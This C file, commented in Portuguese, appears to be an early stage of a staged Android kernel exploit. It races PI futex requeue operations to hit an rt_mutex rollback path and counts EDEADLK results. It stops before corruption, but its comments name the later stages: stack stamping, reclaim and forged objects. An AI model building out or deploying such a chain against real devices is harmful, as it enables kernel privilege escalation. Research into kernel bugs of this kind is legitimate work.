/*
 * ghostlock_race_stats.c — passo 2 da escada (equivale ao --race do dnlid).
 *
 * Monta o par PI real (waiter/owner) e dispara CMP_REQUEUE_PI para atingir
 * rt_mutex_start_proxy_lock + rollback com -EDEADLK. Conta quantas vezes o
 * rollback eh atingido. PARA ANTES de qualquer corrupcao: sem stack
 * stamper, sem reclaim, sem LOCK_PI pos-timeout, sem forged objects.
 *
 * Risco: mesmo do uso normal de PI futex + um EDEADLK por tentativa. O
 * waiter tem timeout curto (2s), nunca trava. Nao ha escrita em kernel.
 *
 * Build: aarch64-linux-android28-clang -O2 -Wall -static -fPIE -pie
 *   ghostlock_race_stats.c -o ghostlock_race_stats
 */
#define _GNU_SOURCE
#include <errno.h>
#include <pthread.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <sys/syscall.h>
#include <time.h>
#include <unistd.h>

#ifndef __NR_futex
#define __NR_futex 98
#endif
#ifndef FUTEX_LOCK_PI
#define FUTEX_LOCK_PI 6
#define FUTEX_UNLOCK_PI 7
#define FUTEX_WAIT_REQUEUE_PI 11
#define FUTEX_CMP_REQUEUE_PI 12
#define FUTEX_PRIVATE_FLAG 128
#endif
#ifndef EDEADLK
#define EDEADLK 35
#endif

#define FLPI (FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG)
#define FUPI (FUTEX_UNLOCK_PI | FUTEX_PRIVATE_FLAG)
#define FWRQ (FUTEX_WAIT_REQUEUE_PI | FUTEX_PRIVATE_FLAG)
#define FCRQ (FUTEX_CMP_REQUEUE_PI | FUTEX_PRIVATE_FLAG)

static uint32_t f_wait, f_target, f_chain;
static volatile int w_ready, w_waiting, o_started;

static long xfutex(void *u1, int op, uint32_t val, void *to, void *u2,
                   uint32_t v3) {
    return syscall(__NR_futex, u1, op, val, to, u2, v3);
}

static void *waiter_fn(void *u) {
    (void)u;
    if (xfutex(&f_chain, FLPI, 0, NULL, NULL, 0)) return NULL;
    w_ready = 1;
    while (!o_started) usleep(1000);
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    ts.tv_sec += 2;
    w_waiting = 1;
    xfutex(&f_wait, FWRQ, 0, &ts, &f_target, 0);
    xfutex(&f_chain, FUPI, 0, NULL, NULL, 0);
    return NULL;
}

static void *owner_fn(void *u) {
    (void)u;
    if (xfutex(&f_target, FLPI, 0, NULL, NULL, 0)) return NULL;
    while (!w_ready) usleep(1000);
    o_started = 1;
    xfutex(&f_chain, FLPI, 0, NULL, NULL, 0); /* bloqueia: deadlock p/ design */
    return NULL;
}

int main(int argc, char **argv) {
    int rounds = argc > 1 ? atoi(argv[1]) : 5;
    if (rounds < 1 || rounds > 20) rounds = 5;
    int edeadlk = 0, other = 0;

    for (int i = 0; i < rounds; i++) {
        f_wait = f_target = f_chain = 0;
        w_ready = w_waiting = o_started = 0;
        pthread_t w, o;
        pthread_create(&w, NULL, waiter_fn, NULL);
        pthread_create(&o, NULL, owner_fn, NULL);
        while (!w_waiting || !o_started) usleep(1000);
        usleep(200000);
        errno = 0;
        xfutex(&f_wait, FCRQ, 1, (void *)(uintptr_t)1, &f_target, 0);
        int e = errno;
        /* desfaz o deadlock: solta target p/ waiter sair limpo. Se o CMP
         * falhou, o timeout de 2s do waiter desfaz sozinho; join eh
         * limitado por esse timeout em todos os casos. */
        xfutex(&f_target, FUPI, 0, NULL, NULL, 0);
        pthread_join(w, NULL);
        pthread_join(o, NULL);
        if (e == EDEADLK) edeadlk++;
        else other++;
        printf("[round %d] cmp_errno=%d (%s)\n", i, e, strerror(e));
    }
    printf("[summary] rounds=%d edeadlk=%d other=%d\n", rounds, edeadlk,
           other);
    return 0;
}
